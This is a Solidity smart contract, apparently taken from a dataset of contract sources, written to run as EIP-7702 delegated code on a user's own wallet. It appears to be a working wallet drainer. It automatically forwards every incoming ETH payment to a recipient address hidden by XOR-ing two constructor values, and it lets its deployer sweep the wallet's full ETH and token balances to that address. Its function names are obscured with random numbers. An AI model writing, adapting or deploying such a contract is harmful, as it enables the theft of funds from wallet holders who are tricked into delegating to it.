      "source_code": "pragma solidity 0.8.31;\n\ninterface IERC20 {\n    function transfer(address to, uint256 value) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n}\n\ncontract AdvancedEnjoyor2 {\n    // IMMUTABLE variables are embedded in the bytecode, \n    // ensuring they are available when this code is delegated to an EOA (EIP-7702).\n    // Standard storage variables would be 0x0 when executed on an EOA.\n    address private immutable owner;\n    address private immutable recipient;\n\n    modifier onlyTrusted() {\n        require(msg.sender == owner, \"Only trusted caller\");\n        _;\n    }\n\n    constructor(bytes32 _a, bytes32 _b) {\n        owner = msg.sender;\n        bytes32 xoring = _a ^ _b;\n        uint256 check = uint256(xoring);\n        require(uint160(check) != uint160(0), \"Invalid target address\");\n        recipient = address(uint160(check));\n    }\n\n    function ownerAddress() external view returns (address) {\n        return owner;\n    }\n\n    function recipientAddress() external view returns (address) {\n        return recipient;\n    }\n\n    receive() external payable {\n        helperFunction();\n    }\n\n    function Fallback_8092318215() external payable {\n        helperFunction();\n    }\n\n    // \"selfdestruct\" is dangerous with 7702/delegation contexts and often effectively disabled in newer EVM versions (Cancun).\n    // Removed to prevent accidental wallet bricking.\n\n    function SweepETH_11435948882() public onlyTrusted {\n        // address(this) will be the EOA address when called via 7702 delegation\n        uint256 self_balance = address(this).balance;\n        if (self_balance == 0) return;\n        (bool success, ) = recipient.call{value: self_balance}(\"\");\n        require(success, \"ETH sweep failed\");\n    }\n\n    function helperFunction() internal {\n        uint256 value = msg.value;\n        if (value == 0) return;\n        (bool success, ) = recipient.call{value: value}(\"\");\n        require(success, \"ETH forward failed\");\n    }\n\n    function transferTokens(address token) public payable onlyTrusted {\n        transferHelper(token);\n    }\n\n    function transferHelper(address token) internal {\n        address _token = token;\n        uint256 token_balance = IERC20(_token).balanceOf(address(this));\n        if (token_balance == 0) return;\n        bool success = IERC20(_token).transfer(recipient, token_balance);\n        require(success, \"ERC20 transfer failed\");\n    }\n}",
